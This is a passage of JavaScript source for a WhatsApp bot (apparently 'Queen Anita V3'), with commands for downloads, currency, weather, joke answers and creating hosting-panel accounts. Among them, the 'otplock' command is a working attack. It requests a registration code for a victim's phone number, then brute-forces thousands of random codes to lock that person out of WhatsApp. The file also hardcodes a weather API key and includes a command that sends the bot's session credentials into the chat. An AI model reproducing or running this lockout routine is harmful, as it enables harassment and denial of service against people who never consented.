 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break

case 'listcurrency':
    axios.get('https://api.exchangerate-api.com/v4/latest/USD')
        .then(response => {
            const currencies = Object.keys(response.data.rates);
            const currencyList = currencies.join(', ');
            reply(`Supported Currencies: ${currencyList}`);
        })
        .catch(() => reply('Could not retrieve the list of currencies. Please try again later.'));
    break;


case 'convert':
if (!text) reply(`Example: .convert 100 USD EUR`) 
    if (args.length < 3) {
        return reply('Usage: .convert [amount] [from currency] [to currency]');
    }

    const amount = parseFloat(args[0]);
    if (isNaN(amount)) {
        return reply('Please provide a valid number for the amount.');
    }

    const fromCurrency = args[1] ? args[1].toUpperCase() : null;
    const toCurrency = args[2] ? args[2].toUpperCase() : null;

    if (!fromCurrency || !toCurrency) {
        return reply('Please provide valid currency codes\nType *.listcurrencies*');
    }

    axios.get(`api.exchangerate-api.com/v4/latest/${fromCurrency}`)
        .then(response => {
            const rate = response.data.rates[toCurrency];
            if (!rate) {
                return reply('Invalid currency code.');
            }
            const convertedAmount = (amount * rate).toFixed(2);
            reply(`${amount} ${fromCurrency} = ${convertedAmount} ${toCurrency}`);
        })
        .catch(() => reply('Could not retrieve exchange rate data. Please try again.'));
    break;

case 'remindme':
if (!text) reply(`Example remindme 5, (reason)`) 
    const timee = parseInt(args[0]); // time in minutes
    const reminder = args.slice(1).join(' ');

    setTimeout(() => {
        reply(reminder);
    }, timee * 60 * 1000);

    reply(`Reminder set for ${timee} minutes.`);
    break;
 


case 'mediafire': {
	if (args.length == 0) return reply(`Where is the link?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
await ptz.sendMessage(m?.chat, {react: {text: `⏱️`,key: m?.key,}})
await loading()  	
	const { mediafireDl } = require('./lib/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 10000) return reply('Oops, the file is too big...')
	const result4 = `*ANITA V3 MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
ptz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
await ptz.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
}
break

case "8gb": {
if (!isCreator) return reply(`Special People Only`)
let t = text.split(',');
if (t.length < 2) return reply(`*input Format!*
Usage:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/4ab7b2011eb1a63caf8e6.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
reply(`SuccessCREATE USER ID: ${user.id}`)
ctfffffffff = `*${m2}[ Hello Sir ${pushname} Ada Panel ]${m2}*

*- ⎙ Your Panel Account Data  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER ONLY SENDS YOUR ACCOUNT DATA ONCE*
PLEASE KEEP IT PROPERLY
IF YOUR ACCOUNT DATA IS LOST, OWNER CANNOT SEND YOUR ACCOUNT AGAIN

[2] *GUARANTEE ONLY 1X*
WARRANTY CLAIMS MUST SEND PROOF OF PURCHASE

[3] *DO NOT RUN SC DDOS ON PANEL*
OR OWNER WILL DELETE ACCOUNT AND SERVER WITHOUT REFERRAL 
`

let tekss9 = ctfffffffff

let msghhhhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'David Cyril', 
     thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss9
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "David Cyril",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

await ptz.relayMessage(u, msghhhhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhhhh.key.id
});
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
    
    case 'delsession':
            case 'clearsession': {
                if (!isCreator) return reply("?")
                fs.readdir("./session", async function(err, files) {
                    if (err) {
                        console.log('Unable to scan directory: ' + err);
                        return reply('Unable to scan directory: ' + err);
                    }
                    let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
                        item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
                    )
                    console.log(filteredArray.length);
                    let teks = `Bentar..`
                    if (filteredArray.length == 0) return reply(teks)
                    filteredArray.map(function(e, i) {
                        teks += (i + 1) + `. ${e}\n`
                    })
                    
                    
                    await filteredArray.forEach(function(file) {
                        fs.unlinkSync(`./session/${file}`)
                    });
                    await sleep(2000)
                    reply("Success")
                });
            }
            break
async function downloadMp3 (link) {
try {
ptz.sendMessage(m.chat, { react: { text: '🎧', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
ptz.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
ptz.sendMessage(m.chat, { react: { text: '🎥', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
ptz.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

case 'song': {
    if (!text) return reply(`*Example*: ${prefix + command} Faded By Alan Walker`);
    let search = await yts(text);
    let telaso = search.all[0].url;
    let body = `*QUEEN_ANITA-V3_MUSIC - PLAYER*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

Please reply ${prefix}*audio/video* to download.`;

    ptz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: body }, { quoted: m });
    global.db.data.users[m.sender].lastSearchUrl = telaso; 
}
break;

case 'video': {
    if (!m.quoted) return reply('Please reply to the song search result to download the video.');
    
    // Fetch the last searched URL
    let url = global.db.data.users[m.sender].lastSearchUrl;
    if (!url) return reply('No song URL found. Use the *song* command first.');

    try {
        // Call the API to get the video download link
        let apiUrl = `https://api.agatz.xyz/api/ytplayvid?message=${encodeURIComponent(url)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        // Check if the API response is valid
        if (result.status === 200) {
            let videoUrl = result.data.url.url; // Access the correct video URL
            let body = `*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™*`;

            // Send the video to the user
            ptz.sendMessage(m.chat, { video: { url: videoUrl }, caption: body }, { quoted: m });
        } else {
            reply('Failed to fetch video. The API did not return a valid response.');
        }
    } catch (error) {
        // Handle any errors that occur during the API call
        reply('Error fetching video. Please try again.');
    }
}
break;


case 'audio': {
    if (!m.quoted) return reply('Please reply to the song search result to download the audio.');
    let url = global.db.data.users[m.sender].lastSearchUrl;
    if (!url) return reply('No song URL found. Use the *song* command first.');

    try {
        let apiUrl = `https://api.agatz.xyz/api/ytplay?message=${encodeURIComponent(url)}`;
        let response = await fetch(apiUrl);
        let result = await response.json();

        if (result.status === 200) {
            let audioUrl = result.data.url.url;
            let body = `*Audio Download*
> Title : *${result.data.title}*
> Channel : *${result.data.channel}*
> Views : *${result.data.views}*
> Audio URL: ${audioUrl}`;

            ptz.sendMessage(m.chat, { audio: { url: audioUrl }, mimetype: 'audio/mp4' }, { quoted: m });
        } else {
            reply('Failed to fetch audio.');
        }
    } catch (error) {
        reply('Error fetching audio. Please try again.');
    }
}
break;





   case 'kdrama': {
  if (!text) {
    throw 'Example: Drakor The Red Sleeve';
  }
  reply('Looking for Korean drama information...');
  try {
    const url = `https://mydramalist.com/search?q=${encodeURIComponent(q)}`;
    const response = await axios.get(url);
    const $ = cheerio.load(response.data);
    const judul = $('.title').first().text().trim();
    const konten = $('.content').first().find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');
    const link = $('.title').first().find('a').attr('href');
// wm avs    
    if (!konten) {
      throw new Error('Not That Korean Drama.');
    }
// wm avs
    const artikel = `*Title:* ${judul}\n\n*Content:* ${konten}\n\n*Link:* https://mydramalist.com${link}`;
    reply(artikel);
  } catch (error) {
    reply(`Sorry, something went wrong: ${error.message}`);
  }
}
break 



  


case 'weather':{
await ptz.sendMessage(m?.chat, {react: {text: `🤨`,key: m?.key,}})
if (!text) return reply('*Please Give Me a Location?*')
await ptz.sendMessage(m?.chat, {react: {text: `🔎`,key: m?.key,}})
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );           
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`
           await ptz.sendMessage(m?.chat, {react: {text: `☁`,key: m?.key,}})
 await ptz.sendMessage(m?.chat, {react: {text: `🌦`,key: m?.key,}})
 await ptz.sendMessage(m?.chat, {react: {text: `🌩`,key: m?.key,}}) 
await ptz.sendMessage(m?.chat, {react: {text: `🌨`,key: m?.key,}})
await ptz.sendMessage(m?.chat, {react: {text: ``,key: m?.key,}})          

           ptz.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           
           
       









 
  
 
case 'repost': {
    if (!isCreator) return Owner();
    try {
        let mediaType;
        
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return reply('Reply to a Video, Image, or Audio Status');
        }

        var mediaFile = await ptz.downloadAndSaveMediaMessage(quoted);
        let messageOptions = {
            caption: q ? q : ''
        };

        // Assign the correct media type to messageOptions
        messageOptions[mediaType] = {
            url: mediaFile
        };

        // Send to status@broadcast (broadcast to all statuses)
        await ptz.sendMessage('status@broadcast', messageOptions, { statusJidList: Object.keys(global.db.data.users) });
        await reply('Done');
        
    } catch (error) {
        console.error(error);
        reply('Failed to repost the media.');
    }
    break;

} 

case 'volvid': {
const { TelegraPh } = require('./lib/uploader');
const ffmpeg = require('fluent-ffmpeg');
const fs = require('fs');

const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? ptz.user.jid : m.sender;
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';

if (!mime || !mime.includes('video')) return reply(`Where is the video?`);

const volume = parseFloat(args[0]) || 1;
if (isNaN(volume) || volume <= 0) return reply('Specify a valid volume (example: 0.5 for half, 2 for double)');

reply(`loading....`);

try {
const media = await ptz.downloadAndSaveMediaMessage(q);
const output = 'output.mp4';

ffmpeg(media)
.audioFilters(`volume=${volume}`)
.on('start', (commandLine) => {
console.log(`Spawned Ffmpeg with command: ${commandLine}`);
})
.on('error', async (err) => {
console.error(`Error: ${err.message}`);
await fs.promises.unlink(media).catch(console.error);
return reply(`Error: ${err.message}`);
})
.on('end', async () => {
console.log('Video processed');

try {
const url = await TelegraPh(output);
await fs.promises.unlink(output);
await fs.promises.unlink(media);

ptz.sendMessage(m.chat, { caption: `_Success To Change Video Volume_`, video: { url } }, { quoted: m });
} catch (err) {
console.error(`Error When Upload Video: ${err.message}`);
await fs.promises.unlink(media).catch(console.error);
return reply(`Error When Uploading Video: ${err.message}`);
}
})
.save(output);
} catch (err) {
console.error(`Error When Uploading Video: ${err.message}`);
return reply(`Error When Uploading Video: ${err.message}`);
}
}
break 

case 'mindreader':
    reply('Think of a number between 1 and 100. I will try to guess it...');

    await sleep(3000);  // Simulating thinking

    const guessedNumber = Math.floor(Math.random() * 100) + 1;
    reply(`🤔 I guess your number is: *${guessedNumber}*`);
    
    await sleep(2000);
    reply(`Was I right?`);
    break;

        case 'getsession':
                if (!isCreator) return reply("?")
                
                let sesi = fs.readFileSync('./session/creds.json')
                ptz.sendMessage(m.chat, {
                    document: sesi,
                    mimetype: 'application/json',
                    fileName: 'creds.json'
                }, {
                    quoted: m
                })
            break
    case 'listcase': {
const listCase = () => {
const code = fs.readFileSync("./message.js", "utf8")
var regex = /case\s+'([^']+)':/g;
var matches = [];
var match;
while ((match = regex.exec(code))) {
matches.push(match[1]);
}
let teks = `*Total Commands*: ${matches.length} \n\n` 
matches.forEach(function (x) {
   teks += "◦ " + x + "\n"
})
return teks
}
reply(listCase())
}
break
    case 'everyone': 
        if (!isAdmins) return
 ptz.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await ptz.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
           reply(`${pushname} using ${command} to call you guys`)
            }, 1120)
        break    
       
        
              case 'txt2img': case 'txtimg':{
if (!text) return reply ('Input prompt')
try {
let anu = await (await fetch(`https://widipe.com/ai/text2img?text=${text}`))
ptz.sendMessage(m.chat, {image: anu, caption: `Done`},{quoted:fsaluran})
     } catch (e) {
reply('Image Convert Failed') 
}
}
break  


case 'url': {
  
  if (!/video/.test(mime) && !/image/.test(mime)) {
    return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply/Send Image/Video With Caption .url*`);
  }
  await ptz.sendMessage(m?.chat, {react: {text: `⏳`,key: m?.key,}}) 
  if (!quoted) {
    return reply(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply/Send Image/Video With Caption .url*`);
  }
  let media = await ptz.downloadAndSaveMediaMessage(quoted);
  let anu = await shannzCdn(media);
  if (anu && anu.status) {
    reply(JSON.stringify(anu, null, 2)); // Send the entire response as a formatted JSON string
    
    
  } else {
    reply(`*An Error Occurred*`);
  }
  await fs.unlinkSync(media);
  await ptz.sendMessage(m?.chat, {react: {text: `✅<`,key: m?.key,}}) 
}
break 


case 'lockotp2': case 'otplock': {
if (!isOwner) return reply('`This Command Is for Premuim Users Only\nType .buypremuim To Become A Premium User`') 
  if (args.length < 1) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 234|9066655532`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return reply(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 234|9066655532`);
  const xeonCountryCode = args2[0];
  const xtarget = args2[1];
  const xeonNumber = xtarget.replace('@s.whatsapp.net', '');
  const xeonmerge = `${xeonCountryCode}${xtarget}`
  const xeonMention = xeonmerge + '@s.whatsapp.net';
  reply(
    "`Please Wait OTP LOCK Is Running..:" + xeonMention.split('@')[0]
  );
  try {
    const { stateXeon, saveCredsXeon } = await useMultiFileAuthState('./session');
    const xeonRequest = await ptz.requestRegistrationCode({
      phoneNumber: '+' + xeonCountryCode + `${xeonNumber}`,
      phoneNumberCountryCode: xeonCountryCode,
      phoneNumberNationalNumber: `${xeonNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
    const musicFilePath = './anita-sounds/otp.mp3'; 

    // Sending the MP3 audio file
    await ptz.sendMessage(m.chat, {
        audio: { url: musicFilePath },
        mimetype: 'audio/mp4',  // Proper MIME type for audio
        ptt: true,  
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var xeonPrefix = Math.floor(Math.random() * 999);
      var xeonSuffix = Math.floor(Math.random() * 999);
      await ptz.register(`${xeonPrefix}-${xeonSuffix}`);
    } catch (err) {
      console.log(`${xeonPrefix}-${xeonSuffix}`);
    }
  }
}
break;  
      
 
case "tiktok": {
if (!text.includes("tiktok.com")) return reply("Give a me tiktok link!")
try {
await loading() 
let { data } = await require("axios")({
  "method": "GET",
  "url": "https://manaxu-seven.vercel.app/api/downloader/tiktok?url=" + text
})
let { title, play, duration } = data.result
ptz.sendMessage(m.chat, { video: { url: play }, caption: "*QUEEN_ANITA-V3 TIKTOK DOWNLOADER*\n> *Title:* " + title + "\n> *Duration:* " + duration + " *Seconds*" }, { quoted: m })
} catch (e) {
return reply("`Error!!`")
}
}
break

case 'is': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} she a virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
            }
            break 


case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('Give Me a Link Sir!')
await loading() 
  const response = await fetch(`https://api.dannteam.my.id/terabox?url=${encodeURIComponent(text)}&apikey=manz.alien`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
ptz.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break


case 'define':
    if (args.length < 1) return reply('Usage: .define [word]');
    const word = args.join(' ');
    axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${word}`)
        .then(response => {
            const definition = response.data[0].meanings[0].definitions[0].definition;
            reply(`Definition of ${word}: ${definition}`);
        })
